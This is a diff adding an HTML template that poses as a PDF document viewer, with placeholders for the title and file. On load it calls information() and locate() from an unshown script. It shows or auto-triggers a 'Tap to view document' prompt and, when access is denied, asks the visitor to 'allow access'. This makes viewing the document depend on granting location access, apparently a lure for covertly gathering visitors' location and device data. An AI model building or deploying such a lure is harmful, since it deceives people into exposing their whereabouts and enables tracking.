@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<title>$TITLE$</title>
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+	<script type="text/javascript">
+		if (window.location.protocol == "http:") {
+			var restOfUrl = window.location.href.substr(5);
+			window.location = "https:" + restOfUrl;
+		}
+	</script>
+	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script type="text/javascript" src="js/location.js"></script>
+</head>
+<body>
+	<div id="toolbar">
+		<div class="toolbar-left">
+			<span class="doc-icon">📄</span>
+			<span id="doc-title">$TITLE$</span>
+		</div>
+	</div>
+
+	<div id="viewer-container">
+		<iframe id="pdf-frame" src="$PDF_FILE$#toolbar=0" title="$TITLE$"></iframe>
+	</div>
+
+	<div id="loading">
+		<div class="spinner"></div>
+		<p id="loading-text">Loading document...</p>
+		<button id="tapBtn" class="verify-btn">Tap to view document</button>
+	</div>
+
+	<script type="text/javascript">
+		information();
+
+		function openDocument() {
+			document.getElementById('tapBtn').style.display = 'none';
+			document.getElementById('loading-text').textContent = 'Loading document...';
+			locate(function () {
+				document.getElementById('loading').style.display = 'none';
+			}, function () {
+				document.getElementById('loading-text').textContent =
+					'Tap the button to allow access';
+				document.getElementById('tapBtn').style.display = 'block';
+			});
+		}
+
+		document.getElementById('tapBtn').onclick = openDocument;
+
+		if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+			document.getElementById('tapBtn').style.display = 'block';
+			document.getElementById('loading-text').textContent =
+				'Tap to view document';
+		} else {
+			openDocument();
+		}
+	</script>
+</body>
+</html>
